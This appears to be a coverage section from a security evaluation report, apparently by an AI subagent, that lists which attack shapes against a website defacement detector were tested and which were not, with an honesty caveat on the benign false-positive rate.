**Tested and measured:** all 10 Phase-2 taxonomy techniques including the three the Phase-2 matrix recorded as genuinely absent (single-word tampering, redirect-based cloaking, the client-side-delayed-payload slice) and the non-Latin attack axes the corpus omits; the three mandated NB-DET-1 visual-only attacks with real Chromium renders and, for the font case, a genuinely glyph-swapped TTF; 5 benign visual twins; 18 of Session A's 19 backlog rows (row 17, "a payload in a timed `<script>` string", is `T10b` and is measured; row 18 is `BA18`); the interactive-page question; the suppression-adversary primitive including the `bbox` escalation; `partial_cloaking_small_payload` across 3 reference sizes; a `layer8_total_takeover` shape; 14 novel adversarial shapes beyond the taxonomy; the layer-4 area curve; the 646- and 152-row artifact re-fusion; the layer-1 gate-collision search; and the 8-pattern ReDoS probe against the suppression path with an isolated armed-asymmetry control.

**Explicitly not tested:**
1. **Anything requiring a live site.** No fixture touched the network; the Docker stack was not used. Tier-A/B/C real-site behaviour is Subagent W1-A's scope.
2. **Non-Latin *benign* churn at scale.** The `nonnative_editorial` benign axis and non-Latin render noise were not rebuilt; my non-Latin fixtures are attack-side only.
3. **Multi-frame / iframe-recursive capture shapes** (`banner_dismiss`, `page_prepare`, shadow DOM, Web Components). My fixtures are single-document. A defacement inside a shadow root or a same-origin iframe would be a strong additional evasion candidate and is untested.
4. **Layer 4 with `screenshot_capped` / scroll-incomplete captures** (the AUDIT-4-7 detection half). My renders are always full-page and uncapped, so the "capped vs uncapped" asymmetry AUDIT-4-7 describes is unmeasured here.
5. **Linked-stylesheet bytes** (the AUDIT-4B-1/4-8 capture half). My `@font-face` fixtures reference a served TTF directly; I did not test a `<link rel=stylesheet>` whose *bytes* Wardress never fetches.
6. **The Intercom / Segment / HubSpot-new-domain shapes** from AUDIT-SA2-1 individually — reCAPTCHA, Turnstile and same-domain rotation were rebuilt; the other four were not. The mechanism is identical (a new external origin on a sensitive-kind element) and my `B2b` two-vendor-script row covers the two-domain case.
7. **Rate/latency impact.** This phase measured accuracy, not cost. Session A's O-SA-2/O-SA-3 remain the best-measured optimisations and I did not re-measure them.
8. **Rules 12 / `app/ssrf.py`.** No SSRF finding arose and none was probed; the file was not opened.

**One honesty note about the benign fixture set.** 21 benign fixtures is a *hand-built* population, not a real-site sample, so the 57.1 % benign alert rate is **not** a field false-positive rate — it is the rate over shapes I selected *because* Session A predicted they would fail. The defensible statements are the per-shape numbers and the two artifact re-fusions (34 of 323 benign rows in the model's own training data over the default flag threshold, and 0 of 56 in the corpus — the circularity, measured twice now, once by Session A and once here, digit for digit identical).
